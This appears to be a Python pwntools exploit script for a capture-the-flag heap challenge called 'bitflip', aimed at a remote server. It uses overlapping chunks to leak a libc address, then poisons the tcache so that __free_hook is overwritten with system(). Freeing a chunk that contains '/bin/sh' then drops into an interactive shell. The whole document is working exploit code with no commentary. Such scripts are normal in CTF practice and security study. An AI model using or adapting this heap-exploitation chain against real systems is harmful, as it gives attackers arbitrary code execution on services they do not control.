from pwn import *
context.log_level = 'debug'

def add(idx,size):
	r.recv()
	r.sendline('1')
	r.recv()
	r.sendline(str(idx))
	r.recv()
	r.sendline(str(size))
def edit(idx,con):
	r.recv()
	r.sendline('2')
	r.recv()
	r.sendline(str(idx))
	r.recv()
	r.send(con)
def show(idx):
	r.recv()
	r.sendline('3')
	r.sendlineafter("Index: ",str(idx))
def dele(idx):
	r.recv()
	r.sendline('4')
	r.sendlineafter("Index: ",str(idx))



r = process("./bitflip")
r = remote("124.71.130.185",49155)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


for i in range(10):
	add(i,0x48)
for i in range(7,-1,-1):
	dele(i)
r.sendlineafter("choice: ",'0'*0x1000)
for i in range(7):
	add(i+1,0x48)
edit(1,'a'*0x40+p64(0xa0)+'\x50')
for i in range(9,1,-1):
	dele(i)
r.sendlineafter("choice: ",'0'*0x1000)
for i in range(7):
	add(i+2,0x48)
add(0,0x48)
add(9,0x48)
add(10,0x48)
show(1)
main_arean_96 = u64(r.recvuntil('\x7f')[-6::].ljust(8,'\x00'))
print "main_arean_96:",hex(main_arean_96)
libc_addr = main_arean_96-96-0x3ebc40
print "libc_addr:",hex(libc_addr)
free_hook = libc_addr + libc.sym['__free_hook']
system = libc_addr + libc.sym['system']

dele(3)
dele(9)
edit(1,p64(free_hook)*2+'\n')
add(3,0x48)
add(11,0x48)
edit(11,p64(system)+'\n')
edit(4,"/bin/sh\x00\n")

#gdb.attach(r)
#raw_input()

dele(4)

r.interactive()